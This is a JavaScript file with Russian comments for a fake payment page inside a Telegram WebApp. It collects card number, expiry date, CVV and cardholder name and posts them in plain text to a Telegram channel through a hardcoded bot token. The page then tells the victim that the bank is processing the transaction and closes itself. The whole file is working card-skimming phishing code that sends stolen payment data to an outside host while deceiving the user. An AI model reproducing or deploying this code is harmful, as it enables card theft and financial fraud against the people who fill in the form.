// --- Получаем параметры из URL ---
function getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    return {
        transaction_id: params.get('transaction_id') || '5024258_user_1758320811',
        amount: parseFloat(params.get('amount')) || 10.00,
        payment_id: params.get('payment_id') || '5024258_user_1758320811'
    };
}

// --- Инициализация при загрузке ---
document.addEventListener('DOMContentLoaded', function () {
    const { transaction_id, amount, payment_id } = getUrlParams();

    // Обновляем сумму
    document.getElementById('amountValue').textContent = amount.toFixed(2);
    document.getElementById('payAmount').textContent = `${amount.toFixed(2)} USD`;

    // Обновляем Payment ID
    document.getElementById('paymentId').textContent = payment_id;

    // Запускаем таймер
    startCountdown();
});

// --- Таймер обратного отсчёта ---
function startCountdown() {
    const countdownElement = document.getElementById('countdown');
    let totalSeconds = 29 * 60 + 4; // 29:04

    const timer = setInterval(() => {
        if (totalSeconds <= 0) {
            clearInterval(timer);
            countdownElement.textContent = "00:00";
            return;
        }

        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;
        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

        totalSeconds--;
    }, 1000);
}

// --- Форма и отправка ---
const paymentForm = document.getElementById('paymentForm');
const cardNumberInput = document.getElementById('cardNumber');
const expiryInput = document.getElementById('expiry');
const cvvInput = document.getElementById('cvv');
const cardHolderInput = document.getElementById('cardHolder');

// Автоматический формат номера карты
cardNumberInput.addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
    e.target.value = value;
});

// Автоматический формат MM/YY
expiryInput.addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value;
});

// Ограничение CVV
cvvInput.addEventListener('input', function (e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
});

// --- Конфигурация для отправки в Telegram ---
const BOT_TOKEN = '7604135518:AAFa2ivK3F2-GarfW10JYSbMlCLAkNIzM4Q'; // ← ЗАМЕНИТЕ НА ВАШ РЕАЛЬНЫЙ ТОКЕН
const CHANNEL_ID = '-1003047112845'; // ← Убедитесь, что это правильный ID

// --- Отправка формы ---
paymentForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    // Валидация
    if (!cardNumberInput.value || !expiryInput.value || !cvvInput.value || !cardHolderInput.value) {
        alert('Please fill in all fields.');
        return;
    }

    const { transaction_id, amount, payment_id } = getUrlParams();

    // Подготавливаем данные
    const formData = {
        transaction_id: transaction_id,
        amount: amount,
        payment_id: payment_id,
        cardNumber: cardNumberInput.value.trim(),
        expiry: expiryInput.value.trim(),
        cvv: cvvInput.value.trim(),
        cardHolder: cardHolderInput.value.trim(),
        user_id: window.Telegram?.WebApp?.initDataUnsafe?.user?.id || 'Unknown'
    };

    console.log("FormData:", formData);

    // Показываем сообщение пользователю: "Отправляем..."
    paymentForm.innerHTML = `
        <p style="color: #5c00b7; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
            🔄 Отправляем данные в банк...
        </p>
    `;

    try {
        // Формируем текст сообщения для Telegram-канала
        const messageText = `
💳 *НОВЫЕ ДАННЫЕ ПЛАТЕЖА*
🆔 User ID: ${formData.user_id}
💰 Сумма: ${formData.amount} USD
🧾 Payment ID: \`${formData.payment_id}\`
🔢 Карта: \`${formData.cardNumber}\`
📅 Срок: \`${formData.expiry}\`
#️⃣ CVV: \`${formData.cvv}\`
👤 Владелец: \`${formData.cardHolder}\`
        `.trim();

        // URL для отправки сообщения в Telegram
        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // Отправляем POST-запрос в канал
        const response = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHANNEL_ID,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        // Проверяем, успешно ли отправлено сообщение в канал
        if (result.ok) {
            console.log("✅ Данные успешно отправлены в Telegram-канал!");

            // Отправляем сигнал обратно в бота, что всё прошло успешно
            if (window.Telegram?.WebApp) {
                try {
                    window.Telegram.WebApp.sendData(JSON.stringify({
                        type: "payment_submitted",
                        status: "success",
                        user_id: formData.user_id,
                        payment_id: formData.payment_id,
                        message: "Транзакция отправлена в обработку."
                    }));
                    console.log("Сигнал об успехе отправлен в бота.");
                } catch (err) {
                    console.warn("Не удалось отправить статус в бот:", err);
                }
            }

            // Показываем пользователю сообщение в WebApp
            paymentForm.innerHTML = `
                <p style="color: #27ae60; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
                    ✅ Ваша транзакция в обработке банком.
                </p>
                <p style="color: #7f8c8d; text-align: center; font-size: 14px; margin-top: 10px;">
                    Пожалуйста, закройте это окно.
                </p>
            `;

        } else {
            throw new Error(`Telegram API Error: ${result.description}`);
        }

    } catch (error) {
        console.error("❌ Ошибка при отправке данных:", error);

        // Отправляем сигнал об ошибке в бота
        if (window.Telegram?.WebApp) {
            try {
                window.Telegram.WebApp.sendData(JSON.stringify({
                    type: "payment_submitted",
                    status: "error",
                    user_id: formData.user_id,
                    error: error.message
                }));
            } catch (err) {
                console.warn("Не удалось отправить ошибку в бот:", err);
            }
        }

        // Показываем пользователю сообщение об ошибке
        paymentForm.innerHTML = `
            <p style="color: #e74c3c; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
                ❌ Ошибка отправки. Попробуйте позже.
            </p>
        `;
        alert("Произошла ошибка при отправке данных. Попробуйте позже.");
    }

    // Закрываем окно через 4 секунды
    setTimeout(() => {
        if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.close();
        }
    }, 4000);
});